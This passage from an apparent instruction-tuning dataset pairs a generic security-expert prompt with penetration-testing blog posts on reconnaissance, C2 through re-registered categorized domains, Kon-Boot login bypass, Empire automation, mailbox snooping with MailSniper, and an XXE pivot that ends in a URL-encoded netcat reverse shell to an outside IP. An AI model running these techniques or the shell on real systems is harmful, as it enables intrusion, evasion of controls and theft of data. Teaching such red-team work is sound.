our fear of vampires but there's no such simple solution There's no way even Cylance is the be-all end-all solution that marketing claims at least for now there are many brilliant minds hard at work in the back room In conclusion if there isn't a silver bullet what do we need Architecture We should be looking at whitelisting for applications and egress internet access Do not under any circumstances believe that moving to whitelisting or an advanced endpoint product is going to be an easy fix You will need to work to properly implement it You will need to have more staff on hand to keep these products fed and happy Every time you hit the easy button God deploys another bot on your network Stop Hitting The Easy Button From South Dakota with love John ______ Much of what we did was based on the existing research of Casey Smith and _TacoRocket Read Colby Farley's blog here wningroot.com and the previous blog of Casey Smith They're truly fantastic and should be mined for tips tricks and hints anytime you're testing an advanced endpoint security product"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>HostRecon: A Situational Awareness Tool</title>\n<taxonomies>Author, Beau Bullock, Recon, Red Team, Red Team Tools, HostRecon, PowerShell, Situational Awareness, tool</taxonomies>\n<creation_date>Tue, 04 Apr 2017 14:04:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Overview HostRecon is a tool I wrote in PowerShell to assist with quickly enumerating a number of items that I would typically check after gaining access to a system It can assist in providing situational awareness to a penetration tester during the reconnaissance phase of an engagement It gathers information about the local system users and domain information Probably the most important thing about it is that it does not use any 'net 'ipconfig 'whoami 'netstat or other system commands I've had some security products alert on the use of those common commands tools Instead those commands have been replaced with PowerShell and WMI queries On many pentests we are still seeing Windows 7 systems that only have PowerShell version 2.0 installed To assist with backward compatibility for these systems I've avoided using many of cmdlets available in PowerShell version 3.0 and up that would have provided the functionality I needed Common Security Product Detection I wanted a tool that had the ability to help quickly identify security products in use on a system HostRecon attempts to enumerate common security products on the system including AV IDS AppWhitelisting Behavioral Analysis etc This will be an ever-changing ever-growing list that I will attempt to keep as updated as possible I've asked my colleagues at BHIS to help me grow this list of security products by sending me any new processes and product names they see on pentests Situational Awareness HostRecon provides information from a target system that will assist a pentester in crafting further attacks Prior to blindly running payloads on a system it's good to know what security protections are in place Is the system running application whitelisting Is there a web proxy in use for Internet traffic Is the local administrator's password possibly randomized HostRecon will attempt to answer some of these questions Having a good situational awareness prior to moving forward should increase your chances of success Here is a full list of things it currently checks Current Hostname Gathers the hostname of the local system IP Information Gathers IP info Alternative for 'ipconfig Current Username Gathers current username Alternative for 'whoami Current Domain Name Gathers current domain name All Local Users Gathers local users from the system Alternative for 'net users Local Admins Group Gathers local admins group members Alternative for 'net localgroup administrators Netstat Information Gathers listening and established connection info Alternative for 'netstat DNS Cache Information Gathers DNS cache information Alternative for 'ipconfig displaydns Shares Gathers Share info Alternative for 'net use Scheduled Tasks Gathers any scheduled tasks from the system Alternative for 'schtasks Web Proxy Information Determines if a web proxy is in use Process Listing Lists out all current running processes on the system AntiVirus Information Checks if AV is enabled and what product is running Firewall Status Determines if the local firewall is enabled or not Local Admin Password Solution LAPS Attempts to locate the DLL used when installing LAPS Domain Password Policy Gathers the domain account password policy Domain Admins Group Members Lists the members of the Domain Admins group Domain Controllers Lists any Domain Controllers Checks for Common Security Products Analyzes the process listing for common security product processes and names Egress Filter Check Invoke-HostRecon also includes a functionality for assessing egress filtering from the system The -Portscan flag can be passed to initiate an outbound portscan against allports.exposed to help determine open ports allowed through an egress firewall Credit for the Portscan module goes to Joff Thyer By running 'Invoke-HostRecon -Portscan it will perform an egress check against allports.exposed as well Usage HostRecon can be downloaded here ithub.com dafthack HostRecon Start a PowerShell session on a system C powershell.exe -exec bypass Import the script PS C Import-Module HostRecon.ps1 Run HostRecon PS C Invoke-HostRecon To perform an egress filter check on the top 100 ports run the following command PS C Invoke-HostRecon -Portscan -TopPorts 100 If you have any other ideas that you would like added into HostRecon please shoot me an email contact me on Twitter dafthack or open an issue on Github Please keep in mind I am avoiding the use of any system tools 'ipconfig 'net 'netstat 'arp etc and also avoiding any PowerShell 3.0 and up cmdlets"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Bypass Web-Proxy Filtering</title>\n<taxonomies>Author, Brian Fehrman, Red Team, Red Team Tools, Bypassing Web-Proxy Filtering, C2 Channels, penetration testing, Pentesting, PowerShell, Web-Proxy Filtering</taxonomies>\n<creation_date>Thu, 13 Apr 2017 15:45:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman Someone recently posed a question to BHIS about creating C2 channels in environments where heavily restrictive egress filtering is being utilized Testers at BHIS and in the industry as a whole routinely run into this type of scenario BHIS strongly encourages the use of egress filtering As with many other security approaches however it is important to realize that this is just one piece of the overall security puzzle There are multiple ways to get around heavy egress-filtering thanks to Beau for the links and insights in this section In some cases tools such as ICMPSploit 1 can be used to create C2 channels using the ICMP protocol DNScat is a well-known tool that utilizes DNS requests and responses for C2 traffic For this blog we are going to focus solely on environments that are only allowing web-based traffic in and out of the environment We will place an additional restriction on this scenario and assume that the environment also uses web-proxy filtering It's becoming more common to see companies not only block known bad sites but also block access to sites that have not received a categorization e.g Shopping Financial Sports etc Even in this type of environment there are numerous ways to establish C2 channels Some of the methods include leveraging Gmail 2 and Outlook 3 Domain-fronting via CDN services is also becoming increasingly popular 4 I would like to focus on a web-proxy filtering bypass method that is known as domain-categorization take-over thanks to harmj0y for the idea I will walk you through the process of getting your own categorized domain and talk about some of the ways you can utilize it The first step is to find a recently expired domain that received a good categorization before it expired The idea is that if you re-register a domain shortly after its previous owner failed to renew it the categorization that was given to that domain will remain intact How do we go about doing that Easy Head on over to the site located at ww.expireddomains.net Now you can use this service without signing up for anything I suggest taking just a few minutes to sign up for a free account With a registered account you are afforded access to a lot more content than you do if you just browse anonymously After logging in you should see something similar to the screenshot below I've highlighted the main area of interest Click on one of the domain suffixes e.g Deleted .info Domains The .com sites will likely be the most expensive to register I typically go for .info which can usually be bought for about 1 year After clicking a Deleted Domain suffix you will be taken to a page that shows recently expired domains with that suffix and a lot of information to go along with it What does all of it mean Well I will talk about what I feel are the most important statistics First click on the Show Filter option The first thing that I like to do is to check the no Adult Names box We don't pass judgment here but web-proxy filters sure do Next I check the only available Domains box to ensure that domains that are currently registered do not appear in the list The last change that I make is to select the SimilarWeb Top Country to be the country in which my target resides This can help to reduce the suspicion of web-proxy filters Once you're satisfied with the filter options click the Apply Filter button towards the bottom of the page Next click on the SimilarWeb heading to sort the expired domains by their SimilarWeb ranking Essentially the lower the number the more reputable the site Once I've applied the sorting I start clicking through the SimilarWeb rating for the domains until I find one that has been assigned a category In this case clicking the SimilarWeb link for gtavdata.info shows that this site was categorized as Reference Maps site Seems innocuous enough for our needs Now that we've found a suitable categorized-domain we need to register it I suggest using ww.namesilo.com since it has a nice interface seems to keep the domain categorization intact and provides free WHOIS privacy We don't need hosting or anything fancy just something to register the domain and set the A record for the domain NameSilo also makes it easy to set up Office 365 Mail with your domain but that is a discussion for another blog post Just type in the name of the domain that you found in the previous step and register away Make sure to pick the correct domain extension e.g .info .com .net etc or else the trick likely won't work After registering the domain name sign in to namesilo.com and head to the DNS settings for that domain The sequence of images below shows the general steps to get there Once you've found the DNS settings click the edit button next to the first A record in the list Change the IP address of that A record to be the IP address of your C2 testing server and then click submit button Next delete the other three default DNS records that NameSilo created for you so that you are left with only the A record that you just edited in the previous step Now we patiently wait for the A record changes to propagate to the public Namesilo.com seems to propagate the changes within fifteen minutes in most cases Keep checking for the update by using your favorite DNS resolution tool against your new domain In the image below you can see that I've used dig to verify that gtavdata.info now points to my C2 server The next step that I usually take is to generate a valid signed SSL-certificate for the new domain Having a trusted certificate to use for encrypting your traffic will add to the ability to bypass traffic-filtering mechanisms help protect any sensitive data that might be transferred and it can also evade some anti-virus tools that would otherwise see the unencrypted payload coming across the network I suggest logging into your C2 server and then checking out Carrie's awesome blog post on how to do this quickly and for free 5 After generating your shiny-new SSL certificate you're ready to use your categorized domain-name for testing Continue reading Carrie's post to see how to use your domain with PowerShell Empire You can also use your certificate and categorized domain with meterpreter and metasploit Below is an example of using msfvenom to generate an HTA payload for my domain Before starting a listener for meterpreter you might want to host your payload so that you can transfer it into your testing environment You might also have other tools that you'd like to have on your testing system for the assessment Apache is one easy way to do this that takes advantage of your certificate and domain One suggestion is to create a folder in the var www html directory on your system For this example let's call it serverfolder mkdir var www html serverfolder Copy your payload file and other tools to the directory that you just created After copying the files make sure that the Apache service is running In the image below I've copied the met_pay.hta payload file and the PowerLine toolset teaser upcoming webcast to my serverfolder directory You can now reach your files by opening a web browser and typing ourdomainname.net serverfolder The next task we will do is to create a listener for our meterpreter payload After downloading the files to your testing system kill the Apache service on your server and start-up msfconsole Issue the commands shown in the screenshot below Make sure to replace the handlersslcert value with the path to your certificate file Head back to the testing system on which you downloaded the payload and run it Head back over to your server and enjoy the new session that was created using your categorized domain and signed SSL-certificate Follow Brian on the Twitters fullmetalcache Shout-outs Carrie Roberts Sally Vandeven Derek Banks Beau Bullock harmj0y and APT team and others that I'm probably forgetting 1 ww.labofapenetrationtester.com 2015 05 week-of-powershell-shells-day-5.html 2 ithub.com byt3bl33d3r gcat 3 ithub.com colemination PowerOutlook 4 log.cobaltstrike.com 2017 02 06 high-reputation-redirectors-and-domain-fronting 5 ww.blackhillsinfosec.com ?p 5447"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Super Sweet Kon-Boot Demo in GIFs</title>\n<taxonomies>Author, Jordan Drysdale, Kent Ickler, Red Team, Red Team Tools, Kon-Boot, thumb drive fun</taxonomies>\n<creation_date>Tue, 11 Apr 2017 16:34:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale victim Kent Ickler adversary In this post our victim locks their computer and heads out for a coffee refill The adversary smashes through all system and user defenses embed ph.is 2omMyIb embed With the system locked and the user not defending her PC Laptop MacBook the adversary has Kon-Boot 2-in-1 installed on a USB drive plugs it in and reboots ww.piotrbania.com all kon-boot embed ph.is 2ooOPnW embed Kon-Boot is as simple as a BIOS boot to a thumb drive The installer is also dead simple and takes about 30 seconds from scratch to weaponized thumb drive The adversary runs through BIOS options and chooses to boot to the thumb drive embed ph.is 2omPgNP embed Kon-Boot does one of two things for bypassing the password screen It can be run in bypass mode note the following one character entry plus a carriage return Or Kon-Boot can be run in 'New User mode and a root or Kon-Boot user will be created and added to local administrators embed ph.is 2p43cwt embed That's it the adversary is in can fetch data run the Bash Bunny for data exfiltration Wi-Fi profile recovery or just dump files with standard Windows drag and drop embed iphy.com gifs transfers-1fkrfmfvyEXug embed Finally the adversary can pull the USB lock reboot do whatever After the reboot aside from the missing open programs files or what-have-you the user is unaware of any trespass embed ph.is 2op9NmL embed Kon-Boot is a must have in every Pentester's Go Kit"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Empire Bootstrapping v2 - How to Pre-Automate All the Things!</title>\n<taxonomies>Author, C2, Kent Ickler, Red Team, automation, automation tools, Kent Ickler, PowerShell Empire, robot with boots, Screen</taxonomies>\n<creation_date>Wed, 19 Apr 2017 16:34:51 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler A robot wearing boots with straps Have you been tasked with automation in the Command and Control C2 world If so your goal is to shorten the overhead time on repetitive tasks related to procuring a valid control channel This wasn't my first rodeo in mundane automation and finding creative shorthand Automating automated tools usually comes without too many headaches It's amazing how a little time in a script can potentially save staff HOURS and even WEEKS of work I'm still surprised though Powershell Empire does not directly accept command line arguments to launch a predefined listener albeit it includes an API The challenge to automate attended Powershell Empire configuration was already presented by Carrie in this blog post The previous work used Screen to create a new shell session window and cast in the appropriate commands With a couple of small changes to Carrie's work a Powershell Empire bootstrap is created for unattended deployment and teardown Review of Screen Screen allows for multiple retained sessions within a Linux system Casting the Powershell Empire directly into a new Screen without attaching the screen causes Empire to be actively loaded in the background of the current session Screen's feature allows passing commands into the new session from the existing session allowing a shell script to mimic an attended session with input Unattended Powershell Empire bootstrap The following script casts a Powershell Empire instance into a new Screen session sends the necessary commands to that Session to clear all existing listeners and the commands to create a new listener The last command commented out for unattended utility attaches the user to the new Empire session Attaching to the new session is optional however since Empire could now be interactively controlled via scripting from other sources scripts The syntax to send commands to the Empire instance are pretty apparent here and modifying to fit your needs for automation or unattended needs should be pretty easy You'll need sudo for Empire sudo -s Don't forget your x flag chmod x Empire_Listener_443.sh Empire_Listener_443.sh Carrie had set most of this work in motion last year with a couple of small updates it becomes unattended and automated Thanks Carrie Empire_Listener_443.sh Clear any Existing empire Screen sessions screen -X -S Empire Quit Launch Empire and wait a few seconds while it starts and brings user to prompt cd directory to Empire screen -S Empire -d -m directory to Empire empire sleep 5 Send unattended commands to the Empire instance screen -S Empire -X stuff 'listeners r screen -S Empire -X stuff 'kill all r screen -S Empire -X stuff 'y r screen -S Empire -X stuff 'set Name OurListener r screen -S Empire -X stuff 'set Port 443 r screen -S Empire -X stuff 'execute r screen -S Empire -X stuff 'back r screen -S Empire -X stuff 'listeners r Echo Connect to this Empire session with 'screen -S Empire -R This leaves the Empire listener running in the background session and the appropriate command to connect to the listener control menu Attended Powershell Empire bootstrap Now to take it one more step this short script can be turned into a bootstrap that will launch Empire and Attach you into a session with the command line argument s you provide You'll need sudo for Empire sudo -s Don't forget your x flag chmod x EmpListener.sh EmpListener.sh listener-name port number .EmpListener.sh OurListener 443 EmpListener.SH Clear any Existing empire screen sessions screen -X -S Empire Quit Launch Empire and wait a few seconds while it starts and brings user to prompt cd directory to Empire screen -S Empire -d -m directory to Empire empire sleep 5 Send unattended commands to the Empire instance screen -S Empire -X stuff 'listeners r screen -S Empire -X stuff 'kill all r screen -S Empire -X stuff 'y r screen -S Empire -X stuff 'set Name 1 r screen -S Empire -X stuff 'set Port 2 r screen -S Empire -X stuff 'execute r screen -S Empire -X stuff 'back r screen -S Empire -X stuff 'listeners r Attach to the new screen session optional screen -S Empire -R Note that if you now attach to the newly created Screen session EMPIRE and exit out of the Powershell Empire instance the Screen session is destroyed as the Empire instance is destroyed leaving you back at your original shell"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Abusing Exchange Mailbox Permissions with MailSniper</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Red Team, email attack, MailSniper, Microsoft, Microsoft Exchange, MS, Office365, OWA, pen-testing, tools</taxonomies>\n<creation_date>Fri, 21 Apr 2017 14:30:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Overview Microsoft Exchange users have the power to grant other users various levels of access to their mailbox folders For example a user can grant other users access to read emails from their Inbox If a user or Exchange administrator isn't careful and sets permissions incorrectly they might grant access to their mailbox to everyone at an organization This creates a situation where any user at the organization can now read email from the mailbox with too broad permissions Using MailSniper it is possible to quickly enumerate mailboxes like this that are accessible by any user In this blog post I'll be describing how this problem can occur how to locate mailboxes with permission issues and ultimately how to read email from these mailboxes without the need for the mailbox owner's credentials Setting Mailbox Permissions with Outlook Changing permissions on a mailbox is a relatively easy thing for a user to accomplish on their own using the Microsoft Outlook client If a user right clicks a folder such as the Inbox then clicks Properties a folder properties menu will open Clicking on the Permissions tab one can see the current settings for the folder This is where things get a bit interesting By clicking the Add button this allows a user to specify a certain account to grant various permissions to This would be ideal because a user can limit access to specific people However you will notice there are Default and Anonymous items already included in Permissions The Default item essentially includes every user at an organization with access to email If a user mistakenly sets the permission level for the Default item to anything other than None besides Contributor they are potentially allowing every employee at an organization access to that mailbox folder Setting permissions on mailbox folders can also be set by an Exchange administrator Using the Set-MailboxFolderPermission cmdlet on the Exchange server directly these mailbox permissions settings can be modified Invoke-OpenInboxFinder As a penetration tester finding mailboxes that are essentially world-readable can be extremely valuable They could allow for a number of interesting attack vectors For one we could search through another user's emails for certain things like passwords or sensitive data without having their credentials Another attack vector could be that if the user's email address is tied to a password reset system an attacker could trigger the password reset then access the user's email containing the password reset link I've added a function into MailSniper called Invoke-OpenInboxFinder to help find mailboxes with permissions set to allow other users access To use it though we first need to gather a list of email addresses from the target environment MailSniper has a module called Get-GlobalAddressList that can be used to retrieve the Global Address List from an Exchange server It will try methods for both Outlook Web Access OWA and Exchange Web Services EWS This command can be used to gather an email list from Exchange Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain username -Password Spring2017 -OutFile global-address-list.txt If you are on a system that can communicate with the target organization's internal Active Directory domain it is also possible to use Harmj0y's PowerView to gather an email list Import the PowerView script into a PowerShell session and run this to get an email list Get-NetUser Sort-Object mail ForEach-Object _.mail Out-File -Encoding ascii emaillist.txt After gathering an email list the Invoke-OpenInboxFinder function can check each mailbox one at a time to determine if the current user has access It also will check to see if there are any public folders in Exchange that could potentially be accessed as well To use Invoke-OpenInboxFinder import the MailSniper PowerShell script into a PowerShell session with Import-Module MailSniper.ps1 Next run the Invoke-OpenInboxFinder function with Invoke-OpenInboxFinder -EmailList emaillist.txt Invoke-OpenInboxFinder will attempt to Autodiscover the mail server-based off of the first entry in the email address list If this fails you can manually set the Exchange server location with the -ExchHostname flag In the below example the command terminal is running as a domain user called 'jeclipse After running Invoke-OpenInboxFinder against a list of email addresses from the domain two public folders were discovered Also the Inbox of maximillian.veers galacticempireinc.com is accessible to 'jeclipse Invoke-OpenInboxFinder will print out the permission levels for each item It can be seen in the output that the Default item is set to Reviewer Searching Other User's Mailboxes with MailSniper After discovering that a mailbox has broad permissions that allows a user to access it MailSniper could then be used to read and search through the messages in the target mailbox The Invoke-SelfSearch function of MailSniper previously was purposed for primarily searching the mailbox of the user who was running it I've modified it slightly to allow for checking another user's email A new flag called OtherUserMailbox needs to be specified to access other mailboxes An example command would be the following Invoke-SelfSearch -Mailbox target-email-address domain.com -OtherUserMailbox In the screenshot below I am using the jeclipse account to search maximillian.veers galactiempireinc.com's mailbox Three results were found where the subject or body of his emails contained the terms password creds or credentials Office365 and Externally Facing Exchange Servers Invoke-OpenInboxFinder also works across the Internet against Office365 and externally facing Exchange servers if Exchange Web Services EWS is accessible Unless Autodiscover is set up externally it is likely you will need to manually specify the target hostname with -ExchHostname For connecting to Office365 the hostname would be outlook.office365.com Specify the -Remote flag to have Invoke-OpenInboxFinder prompt for credentials that can be used to authenticate to the remote EWS service An example command for checking mailboxes hosted on Office365 for broad permissions would be the following Invoke-OpenInboxFinder -EmailList emaillist.txt -ExchHostname outlook.office365.com -Remote Below is a screenshot from an actual real-world assessment where the customer utilized Office365 We had access to a single user's credentials at the organization By running Invoke-OpenInboxFinder using an email list gathered from the Global Address List we were able to determine that three separate accounts at the organization allowed our user to read their email Recommendations Obviously preventing an attacker from gaining access to a valid user account would be the first step in defending against this The problem though is that it doesn't prevent your current employees from using this technique to see what other users ur mailboxes they have access to Also note that it does appear that you must have a valid domain account that also has a mailbox in Exchange associated with it to check permissions on other uss mailboxes If possible restricting these types of changes from being made on the Outlook client would be helpful I've found a few older 2010 posts stating the permissions tab can be locked down with a GPO I have not personally tried any of the solutions offered on these pages but it might be worth checking out You can find those here and here Use the Invoke-OpenInboxFinder function in MailSniper or the Get-MailboxFolderPermission cmdlet on Exchange to audit these settings for all accounts at an organization Conclusion Mailbox permissions are something that should be looked at by both blue and red teams With the way Outlook includes the Default permission item in folder properties it makes it far more likely that a user mistakenly grants everyone at an organization access to their mailbox On the red team side this could provide an opportunity to find passwords or other sensitive data within emails that might further access on the network Blue teams should worry about that but they also have other things to worry about Some other things blue teams should worry about are high-profile accounts C-Suite types accidentally sharing their mailboxes out with the company corporate employees snooping on other employees or even the legalities of mailbox modification through these avenues ______ You can download MailSniper from Github here ithub.com dafthack mailsniper Special thanks to 'doomguy for opening an issue in the MailSniper repository on Github asking if this capability would be possible"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Web Server Screenshots with a Single Command</title>\n<taxonomies>External/Internal, Red Team, Red Team Tools, EyeWitness, good to know, handy dandy, penetration testing, Pentesting, screenshots, tool</taxonomies>\n<creation_date>Mon, 24 Apr 2017 14:23:13 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts EyeWitness is a handy tool developed by Chris Truncer for grabbing web browser screenshots from a list of URLs Especially handy for pen-testers is its ability to create the list of target URLs from Nessus scan output files Whenever I do a Nessus vulnerability scan against a client I always run EyeWitness against the scan results This is because Nessus reports all detected web servers as an informational finding and these can have vulnerabilities that are obvious to a human but hard for a scanner to detect For example one scan detected several web servers and listed the finding as informational However visiting each of these URLs in a web browser revealed streaming video of the client's internal offices Clearly a security concern Another common finding on internal network scans is embedded web servers that accept default credentials such as those found on routers switches printers and VOIP phones The tool can run on both Linux and Windows and I use it often Although occasionally I am in a situation where I am not able to use it For example when I have access to a Windows system only and application whitelisting is in play or when moving files to the system is difficult For such situations I came up with the following Windows command line one-liner Not as nifty as EyeWitness but having another quick an easy option comes in handy from time to time First I generate the list of URLs based on the Nessus scan results One option for doing this is to export the CSV version of the scan results and do a quick formula in Excel to build the list of URLs based on the Service Detection scan result The other method is to export the scan results as a .nessus file move that to my own local Linux instance and use EyeWitness with the createtargets option as shown below EyeWitness.py -f internal_scan_results.nessus --createtargets URLs.txt Then I move this list to the Windows environment I am working in and I can run the following command to open each of the URLs in the URLs.txt file using Internet Explorer for F u in URLs.txt do start iexplore u However if I have more than a handful of URLs to work on this will open up way too many Internet Explorer windows at once To deal with this I added a counter and use it to pause after every five URLs opened Before this will work you need to first enable delayed variable expansion on the command line with this command cmd.exe V ON Once you have done this you can proceed with the following command set a count 1 for F u in URLs.txt do start iexplore u echo u set a _result !count 5 NUL if !_result 0 pause set a count 1 Note If you run the command above and it doesn't pause after every five URLs then you forgot to do the prerequisite cmd.exe V ON command This gives you a chance to manually inspect five web interfaces at a time taking screenshots when it is interesting and trying default credentials When you are ready to move on just press any key in the command window to unleash another five The command window output is shown below the URL is echoed to the command line and opened in Internet Explorer in groups of five Press any key when you are ready to continue This beats doing the same task manually by copy and pasting URLs into a browser window when using EyeWitness is not an option Enjoy Want to do something similar from Linux Try this one-liner from h1ghtopfade xargs -a URLs.txt firefox -new-tab line"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>XML External Entity - Beyond /etc/passwd (For Fun & Profit)</title>\n<taxonomies>External/Internal, Red Team, Red Team Tools, Gold Paper, Internal Pen Test, Pivot, Vulnerabilities, XML External Entity, XXE</taxonomies>\n<creation_date>Thu, 27 Apr 2017 15:29:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Robert Schwass Last week I was asked twice in one day if I knew what XML External Entity XXE Vulnerabilities were Maybe they are making a comeback in mainstream security buzz or sales jargon I have no idea Often buzz-words propagated by the media or sales engineers become the driving factor for many of the conversations I have There are great articles out there already that explain the details of XXE if you need clarification on the vulnerability check out the GIAC Gold Paper by Carrie Roberts here Until recently XXE was never something I wouldn't get excited about Usually I would just leverage the vulnerability to read files from the local system Some bugs I drool for and hope to find XXE was never one of them So I began looking into the latest XXE vulns on exploit-db watching talks on YouTube and reading papers blogs articles on XXE The OWASP documentation is a good place to start ww.owasp.org index.php XML_External_Entity_ XXE _Processing The bit that caught my attention in the OWASP information is an attacker may use this trusted application to pivot to other internal systems possibly disclosing other internal content via http s requests or launching a CSRF attack to any unprotected internal services Now We're Talking Let's See What We Can Do The great thing about many of the XML parser implementations available today is that they allow for XXE exploitation by default Take the following PHP script it parses XML sent to it and echoes it back to the user I named mine NEW_XXE.php and stuck it in the CUSTOM directory under my web root This application does absolutely nothing but who cares we want to mess with the parser itself I install this PHP script on WEBSVR01 loadXML xmlfile LIBXML_NOENT LIBXML_DTDLOAD xml simplexml_import_dom dom stuff xml stuff str stuff n echo str You can throw the above script into your PHP server make sure you install php-xml if you want to create this scenario in a lab Now create an xml file to send as a request to the server with the following content I named mine send.txt and send it from WEBSVR01 to localhost to make sure everything works as expected locally This is my stuff Put whatever you want in stuff and send it to WEBSVR01 aka localhost like so See the echoed response So the application is up and running Good Now we can mess with the parser Let's call some External Entities Modify send.txt to be the following This is a typical XXE attack against a Linux System and is a good way to prove the vulnerability exists If everything is working correctly you should get a dump of etc passwd From WEBSVR01 send it again to localhost Another very useful thing you can do with XXE is create HTTP requests Start the python SimpleHTTPServer on port 8888 on WEBSVR01 and let's see what happens And on my python http server Cool we can send http requests From a remote system I can exploit this vulnerability and get some of the network information First let me paint the picture you find this vulnerability on a web server on the internet and you want to use it as a pivot point The diagram below lays it all out I get a web server on 34.200.157.128 that host is really WEBSVR01 behind the NAT Firewall device WEBSVR01 has an XXE vulnerability that I want to use to gather information and potentially exploit WEBSRV02 I'm sitting on the open internet on my Attack PC You know it's an Ubuntu server because you did a proper enumeration There are a few places you want to look to get the networking information of this server First you want to grab etc networking interfaces and if you need more information look in proc net route These values are hex and you may need to convert them if it comes to that Let me walk you through it From my Attack PC Ubuntu 14 LTS I create the request file to grab etc network interfaces from the vulnerable web server On ATTACK PC Edit the file to grab etc passwd Make the request Great We now know the IP Scheme of the Internal network or DMZ this host is sitting on Let's grab the default page of this server via XXE using its internal IP address 10.0.0.3 NOTE Some characters will break the XML So far we have only looked at files or made simple http requests that did not return characters that would break our XML Since we are using PHP we can base64 encode what is returned On the ATTACK PC Change your send.txt to match the following adding the following PHP filter Now Send The Request We get a bit of base64 back Once decoded we have the page contents Building an HTTP Scanner Putting this all together I can now scan the internal IP range for web servers Of course some Python You can get the script on my GitHub here From the ATTACK PC EXECUTE Let's see what the Base64 Decodes as for the data returned from 10.0.0.4 Hmmm CoreHTTP Nice little exploit on exploit-db.comww.exploit-db.com exploits 10610 Since we are getting an index.pl Perl file I'm going to assume CGI is enabled so this exploit could work And it works by passing the parameters in a GET request so we can exploit it through the XXE vulnerability on the external facing host After decrypting the Metasploit Module the request that needs to be sent looks like this URL encoded http request 0.0.0.4 index.pl 60mknod 20backpipe 20p 20 26 26 20nc 2034.200.157.80 201337 200 3Cbackpipe 20 7C 20 2Fbin 2Fbash 201 3Ebackpipe 26 60 Notice I put my IP address in there 34.200.157.80 and the port my Netcat listener will be on The entire string is an URL encoded reverse Netcat shell without the -e support utilizing mknod and a backpipe So let's trigger the exploit on 10.0.0.4 via the XXE Vulnerability On the ATTACK PC Create a Netcat listener and Execute Looks like a Reverse Shell So there you have it A small tutorial on taking an XML External Entity vulnerability from an external host and using it to exploit a vulnerability on an internal host I want to thank BHIS and special thanks to Carrie Roberts for the excellent Gold Paper _______ Robert is a guest poster on our blog Interested in guest posting Contact us here Join the BHIS Blog Mailing List get notified when we post new blogs webcasts and podcasts jetpack_subscription_form show_only_email_and_button true custom_background_button_color undefined custom_text_button_color undefined submit_button_text Subscribe submit_button_classes undefined show_subscribers_total true"
    },
    {
        "input": "",
